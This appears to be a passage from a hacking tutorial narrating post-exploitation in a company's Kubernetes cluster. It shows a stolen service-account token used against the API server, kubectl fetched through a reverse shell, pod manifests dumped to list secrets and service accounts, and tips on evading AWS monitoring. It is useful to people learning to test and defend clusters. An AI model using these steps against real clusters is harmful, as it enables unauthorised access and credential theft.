
```
"kind": "APIVersions",
"versions": ["v1"],
"serverAddressByClientCIDRs": [{
"clientCIDR": "0.0.0.0/0",
"serverAddress": "ip-10-0-34-162.eu-west-1.compute.internal:443"
}]
```

Ho! It seems that the default service account indeed has more privileges than the anonymous account. We've managed to grab a valid identity inside the cluster.

## Recon 2.0

Time for some reconnaissance. We download the API specification available on the https://10.100.0.1/openapi/v2 endpoint and explore our options.

We start by fetching the cluster's /version endpoint. If the cluster is old enough, there may be the possibility to leverage a public exploit to elevate privileges:

```
shell> curl -Lk https://10.100.0.1/version --header "Authorization: Bearer $TOKEN"
{
  "major": "1",
  "minor": "14+",
  "gitVersion": "v1.14.6-eks-5047ed",
  "buildDate": "2019-08-21T22:32:40Z",
  "goVersion": "go1.12.9",
  --snip--
}
```

MXR Ads is running Kubernetes 1.14 supported by Elastic Kubernetes Service (EKS), AWS's managed version of Kubernetes. In this setup, AWS hosts the API server, etcd, and other controllers on their own pool of master nodes, also called the controller plane. The customer (MXR Ads, in this case) only hosts the worker nodes (data plane).

This is important information because AWS's version of Kube allows a stronger binding between IAM roles and service accounts than the self-hosted version. If we pwn the right pod and grab the token, we not only can attack the Kube cluster but also AWS resources!

We continue our exploration by trying several API endpoints from the OpenAPI documentation we retrieved. We try api/v1/namespaces/default/secrets/, api/v1/namespaces/default/serviceaccounts, and a bunch of other endpoints that correspond to Kube resources, but we repeatedly get shut down with a 401 error message. If we continue like this, the error rate will draw unnecessary attention. Luckily, there is a Kube API called /apis/authorization.k8s.io/v1/selfsubjectaccessreview that tells us right away if we can perform an action on a given object.

It's a hassle to call it manually through a curl query, as that would require a long and ugly payload in JSON, so we download the Kubectl program through our reverse shell. This time we don't need to set up a config file, because Kubectl autodiscovers environment variables injected by the cluster, loads the current token from the mounted directory, and is 100 percent operational right away. Here we download the Kubectl binary, make it executable, and retrieve the cluster version once more:

```
shell> wget https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/kubectl

shell> chmod +x kubectl && ./kubectl version

Server Version: version.Info {Major:"1", Minor:"14+", GitVersion:"v1.14.6-eks-5047ed"...
```

Perfect! Everything is working fine. Now we repeatedly call the auth can-i command on the most common instructions—get pods, get services, get roles, get secrets, and so on—to fully explore all the privileges assigned to this default token we are operating with:

```
shell> ./kubectl auth can-i get nodes
no
shell> ./kubectl auth can-i get pods
yes
```

We quickly come to the conclusion that the only permission we currently have is to list pods in the cluster. But when we explicitly call the get pods command, we get the following error:

```
shell> ./kubectl get pods
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:prod:default" cannot list resource "pods" in
API group "" in the namespace "default"
```

What if we try targeting the prod namespace—the same one hosting our service account?

```
shell> ./kubectl get pods -n prod

stats-deployment-41de-4jxa1    1/1 Running   0   13h51m

redis-depl-69dc-0vslf          1/1 Running   0   21h43m

ssp-elastic-depl-3dbc-3qozx    1/1 Running   0   14h39m

ssp-feeder-deployment-13fe-3evx 1/1 Running   0   10h18m

api-core-deployment-d34c-7qxm  1/1 Running   0   10h18m
--snip--
```

Not bad! We get a list of hundreds and hundreds of pods running in the prod namespace.

Since all pods lacking an identity run with the same default service account, if one person grants extra privileges to this default account, all the other pods running with the same identity will automatically inherit these same privileges. All it takes is for someone to execute an unwitting kubectl apply -f <url> that grabs an ill-conceived resource definition from an obscure GitHub repo and hastily apply it to the cluster. It is sometimes said that this Kubectl installation command is the new curl <url> | sh. That’s the hidden cost of complexity: people can blindly pull and apply manifest files from GitHub without inspecting or even understanding the implications of the very instructions they execute, sometimes even granting extra privileges to the default service account. This is probably what occurred in this case, since the default account has no built-in set of privileges.

But that’s just the tip of the iceberg. With the right flags, we can even pull the entire manifest of each pod, giving us an absolute plethora of information, as shown in Listing 8-3.

```
shell> ./kubectl get pods -n prod -o yaml > output.yaml
shell> head -100 output.yaml

--snip--
spec:
containers:
  - image: 886371554408.dkr.ecr.eu-west-1.amazonaws.com/api-core
    name: api-core
  - env:
    - name: DB_CORE_PASS
      valueFrom:
        secretKeyRef:
          key: password
          name: dbCorePassword
volumeMounts:
  - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
    name: apicore-token-2mpcg
    readOnly: true
nodeName: ip-192-168-162-215.eu-west-1.compute.internal
hostIP: 192.168.162.215
phase: Running
podIP: 10.0.2.34
--snip--
```

*Listing 8-3: Downloading the pod manifest file*

And that truncated output, my friends, was just barely one pod! We only have the permission to get pod information, but that fortunately means accessing the pod manifest files, which include the nodes the pods are running on, the names of secrets, service accounts, mounted volumes, and much more. That’s almost full reconnaissance at the namespace level with one tiny permission.

The output, though, is horribly unexploitable. Manually digging through YAML files is a form of punishment that should only be bestowed on your archenemy. We can format the result from Listing 8-3 using Kubectl’s powerful custom output filters:

```
shell> ./kubectl get pods -o="custom-columns=\
NODE:.spec.nodeName,\
POD:.metadata.name"
```

| NODE | POD |
|---|---|
| ip-192-168-162-215.eu-... | api-core-deployment-d34c-7qxm |
| ip-192-168-12-123.eu-... | ssp-feeder-deployment-13fe-3evx |
| ip-192-168-89-110.eu-... | redis-depl-69dc-0vslf |
| ip-192-168-72-204.eu-... | audit-elastic-depl-3dbc-3qozx |

This rather explicit command only displays the spec.nodeName and metadata.name fields of the pods’ manifests. Let’s get some additional data, like secrets, service accounts, pod IPs, and so on. As you can see in Listing 8-4, the filter grows thicker to read, but it essentially walks through arrays and maps in YAML to fetch the relevant information.

```
shell> ./kubectl get pods -o="custom-columns=\
NODE:.spec.nodeName,\
POD:.metadata.name,\
PODIP:.status.podIP,\
SERVICE:.spec.serviceAccount,\
ENV:.spec.containers[*].env[*].valueFrom.secretKeyRef,\
FILESECRET:.spec.volumes[*].secret.secretName"
```

| NODE | POD | PODIP | SERVICE | ENV | FILESECRET |
|---|---|---|---|---|---|
| ip-192... | api-... | 10.0.2... | api-token | dbCore... | api-token-... |
| ip-192... | ssp-f... | 10.10... | default | dbCass... | default-... |
| ip-192... | ssp-r... | 10.0.3... | default | <none> | default-... |
| ip-192... | audit... | 10.20... | default | <none> | default-... |
| ip-192... | nexus... | 10.20.... | default | <none> | deploy-secret... |

*Listing 8-4: Full recon at the namespace level: node and pod names, pod IPs, service accounts, and secrets*

I’ve truncated the output to fit on the page, so I’ll describe it here. The first two columns contain the names of the node and the pod, which help us deduce the nature of the application running inside. The third column is the pod’s IP, which gets us straight to the application, thanks to Kube’s flat network design.

The fourth column lists the service account attached to each pod. Any value other than default means that the pod is likely running with additional privileges.

The last two columns list the secrets loaded by the pod, either via environment variables or through a file mounted on disk. Secrets can be database passwords, service account tokens like the one we used to perform this command, and so on.

What a great time to be a hacker! Remember when reconnaissance entailed scanning the /16 network and waiting four hours to get a partially similar output? Now it’s barely one command away. Of course, had the default service account lacked the “get pods” privilege, we would have had to resort to a blind network scan of our container’s IP range. AWS is very keen on this kind of unusual network traffic, so be careful when tuning your Nmap to stay under the radar.
